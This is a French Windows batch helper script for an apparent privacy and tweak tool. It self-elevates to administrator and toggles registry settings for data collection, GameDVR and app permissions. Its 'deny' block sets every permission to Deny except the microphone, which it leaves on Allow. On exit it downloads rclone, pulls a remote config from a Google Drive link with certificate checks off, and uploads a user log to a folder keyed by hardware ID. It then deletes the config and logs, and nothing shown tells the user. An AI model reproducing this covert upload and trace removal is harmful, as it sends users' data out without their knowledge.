:DQSADM
@echo off
@Title DQS-AD
cd /d %~dp0
set indigo=[38;5;105m
set white=[37m
set light_red=[91m
cls

rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
if %errorlevel% neq 0 (
	powershell -NoProfile -NonInteractive -Command start -verb runas "'%~s0'" >nul 2>&1 & exit /b
)

IF EXIST PID.log (
	for /f "usebackq tokens=*" %%a in ("PID.log") do (
    	set "PID=%%a"
    	goto :PIDF
	)
) else (
	echo NO - PID.log
	Ping 10>nul
	goto :DQSADM
)

:PIDF

set "TargetPID=%PID%"
DEL PID.log
set IDS=1

:PIDFV
cls
echo I-------------------------------------------------------------------------------I
echo  Veillez a ne pas fermer ce script, cela pourrait perturber le script principal.
echo.
echo  Ce script, qui est execute en [%indigo%Administrateur%white%], sert a communiquer avec 
echo  le script principal, lui-meme execute en tant que [%indigo%TrustedInstaller%white%]. 
echo.
echo  Si ce script est arrete, cela pourrait entrainer des erreurs dans le script 
echo  principal et des cles de registre pourraient ne pas etre ajoutees correctement.
echo.
echo  %light_red%Ce script se fermera automatiquement quelques secondes apres la fermeture du 
echo  script principal.%white%
echo I-------------------------------------------------------------------------------I

IF EXIST MYCFA.CONF (
	DEL MYCFA.CONF
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "1" /f
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "1" /f
)

IF EXIST MYCFD.CONF (
	DEL MYCFD.CONF
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
	Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
	Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
)

IF EXIST GCSA.CONF (
	DEL GCSA.CONF
	Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "1" /f
)

IF EXIST GCSD.CONF (
	DEL GCSD.CONF
	Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
)

IF EXIST DENYP.CONF (
	DEL DENYP.CONF
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
)

IF EXIST ALLOWP.CONF (
	DEL ALLOWP.CONF
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Allow" /f
)

tasklist /FI "PID eq %TargetPID%" | findstr "cmd.exe" >nul

if %errorlevel% equ 0 (
	IF %IDS%==1 (
		IF EXIST IID.log (
			set HHWID=
			for /f "usebackq tokens=*" %%a in ("IID.log") do (
    			set "HHWID=%%a"
			set IDS=2
    			goto :PIDFV
		)
		) else (
			Ping 02>nul
			goto :PIDFV
	)
	)
) else (
	goto :SYSSTP2
)

Ping 02>nul
goto :PIDFV

:SYSSTP2

IF EXIST rclone.exe goto :ESXRCONE
curl -g -k -L -# -o "rclone-current-windows-amd64.zip" "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
tar -xvf rclone-current-windows-amd64.zip

setlocal enabledelayedexpansion

set "dossier_dezippe="
for /d %%i in (*) do (
    if exist "%%i\rclone.exe" (
        set "dossier_dezippe=%%i"
        goto CopierRclone
    )
)

:CopierRclone
copy "%dossier_dezippe%\rclone.exe"
@timeout /t 02>nul
rmdir /s /q "!dossier_dezippe!"
del /q "rclone-current-windows-amd64.zip"
endlocal
:ESXRCONE
IF EXIST rclone.conf goto :ESXRCONEC
curl -g -k -L -# -o "rclone.conf" "https://docs.google.com/uc?export=download&id=1bnsVjioFmO5qW1h7wflWINnpG5qeGjSk"
:ESXRCONEC

Ping 10>nul
rclone --config="rclone.conf" copy QTS-USRL.log QTS:%HHWID%/
Ping 10>nul
DEL QTS-USRL.log
DEL ID.log
DEL IID.log
DEL temp2.txt
DEL rclone.conf
Exit






